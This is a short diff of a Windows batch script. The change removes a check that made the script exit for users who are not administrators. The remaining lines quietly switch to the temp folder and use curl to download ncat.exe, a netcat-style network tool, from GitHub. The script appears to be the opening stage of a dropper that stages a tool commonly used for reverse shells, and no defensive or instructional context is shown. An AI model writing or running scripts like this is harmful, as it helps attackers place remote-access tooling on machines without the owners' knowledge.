@@ -1,9 +1,5 @@
 @echo off
 
-whoami /groups | findstr /i "S-1-5-32-544" >nul 2>&1
-if %errorlevel% NEQ 0 (
-    exit
-)
 
 cd %temp%
 curl -L https://github.com/cyberisltd/NcatPortable/raw/refs/heads/master/ncat.exe -o ncat.exe
